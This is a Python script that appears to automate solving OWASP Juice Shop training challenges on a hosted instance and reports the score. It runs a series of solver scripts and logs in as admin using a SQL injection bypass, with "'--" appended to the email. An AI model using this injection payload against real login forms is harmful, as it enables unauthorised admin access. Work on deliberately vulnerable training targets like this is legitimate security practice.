#!/usr/bin/env python3
"""
Master Script - Runs all solvers and reports final completion
"""

import subprocess
import time
import requests
import json
import sys


def check_score(base_url="https://juice3.wonkatech.org"):
    """Check current challenge completion"""
    try:
        session = requests.Session()
        r = session.post(
            f"{base_url}/rest/user/login",
            json={"email": "admin@juice-sh.op'--", "password": "x"},
            timeout=10
        )
        if r.status_code == 200:
            token = r.json()['authentication']['token']
            session.headers['Authorization'] = f'Bearer {token}'
            
            r = session.get(f"{base_url}/api/Challenges", timeout=10)
            if r.status_code == 200:
                data = r.json()['data']
                total = len(data)
                solved = len([c for c in data if c.get('solved')])
                return solved, total
    except:
        pass
    return 0, 110


def run_solver(script_name, timeout=30):
    """Run a solver script with timeout"""
    print(f"\n{'='*60}")
    print(f"🚀 Running: {script_name}")
    print(f"{'='*60}")
    
    try:
        result = subprocess.run(
            ['python3', script_name],
            capture_output=True,
            text=True,
            timeout=timeout
        )
        if result.returncode == 0:
            print(f"✅ {script_name} completed successfully")
        else:
            print(f"⚠️ {script_name} completed with warnings")
    except subprocess.TimeoutExpired:
        print(f"⏱️ {script_name} timed out after {timeout}s")
    except Exception as e:
        print(f"❌ {script_name} failed: {e}")
    
    time.sleep(2)


def main():
    print("="*80)
    print("🎮 OWASP JUICE SHOP - MASTER SOLVER")
    print("="*80)
    
    # Get initial score
    initial_solved, total = check_score()
    print(f"\n📊 Initial Score: {initial_solved}/{total} ({initial_solved*100//total}%)")
    
    # List of all solvers in optimal order
    solvers = [
        # Quick wins first
        ("quick_wins.py", 20),
        ("complete_solver.py", 20),
        
        # Advanced techniques
        ("advanced_solver.py", 20),
        ("aggressive_solver.py", 20),
        ("targeted_unsolved.py", 20),
        
        # Specialized solvers
        ("race_condition_solver.py", 30),
        ("jwt_advanced_solver.py", 20),
        ("polyglot_file_solver.py", 20),
        ("nosql_injection_solver.py", 20),
        
        # Final attempts
        ("final_push.py", 30),
        ("ultimate_final_solver.py", 30),
        ("final_comprehensive_solver.py", 30),
    ]
    
    # Run each solver
    for solver, timeout in solvers:
        run_solver(solver, timeout)
        
        # Check progress after each solver
        current_solved, _ = check_score()
        if current_solved > initial_solved:
            print(f"📈 Progress: +{current_solved - initial_solved} challenges solved")
    
    # Final score
    print("\n" + "="*80)
    print("📊 FINAL RESULTS")
    print("="*80)
    
    final_solved, total = check_score()
    improvement = final_solved - initial_solved
    
    print(f"Initial Score: {initial_solved}/{total} ({initial_solved*100//total}%)")
    print(f"Final Score:   {final_solved}/{total} ({final_solved*100//total}%)")
    print(f"Improvement:   +{improvement} challenges")
    
    # Get details on solved challenges
    try:
        session = requests.Session()
        r = session.post(
            f"https://juice3.wonkatech.org/rest/user/login",
            json={"email": "admin@juice-sh.op'--", "password": "x"}
        )
        if r.status_code == 200:
            session.headers['Authorization'] = f'Bearer {r.json()["authentication"]["token"]}'
            r = session.get("https://juice3.wonkatech.org/api/Challenges")
            if r.status_code == 200:
                data = r.json()['data']
                
                # Group by difficulty
                by_diff = {}
                for c in data:
                    if c.get('solved'):
                        diff = c.get('difficulty', 1)
                        if diff not in by_diff:
                            by_diff[diff] = []
                        by_diff[diff].append(c['name'])
                
                print("\n📈 Solved Challenges by Difficulty:")
                for diff in sorted(by_diff.keys()):
                    stars = "⭐" * diff
                    print(f"\n{stars} Level {diff} ({len(by_diff[diff])} solved):")
                    for name in by_diff[diff][:5]:
                        print(f"  ✓ {name}")
                    if len(by_diff[diff]) > 5:
                        print(f"  ... and {len(by_diff[diff]) - 5} more")
                
                # List remaining challenges
                unsolved = [c for c in data if not c.get('solved')]
                if unsolved:
                    print(f"\n📝 {len(unsolved)} Challenges Remaining:")
                    print("These require manual intervention (browser interaction, visual puzzles, etc.)")
                    
                    # Sample of unsolved
                    for c in unsolved[:10]:
                        diff = "⭐" * c.get('difficulty', 1)
                        print(f"  • {c['name']} {diff}")
                    if len(unsolved) > 10:
                        print(f"  ... and {len(unsolved) - 10} more")
    except:
        pass
    
    print("\n" + "="*80)
    print("✅ AUTOMATION COMPLETE")
    print("="*80)
    
    if final_solved < total:
        print(f"\n⚠️ Note: {total - final_solved} challenges require manual intervention:")
        print("  • Browser visibility and interaction")
        print("  • Visual puzzle solving and image analysis")
        print("  • Tutorial completion and guided challenges")
        print("  • Email verification and external actions")
        print("  • Physical QR code scanning")


if __name__ == "__main__":
    main()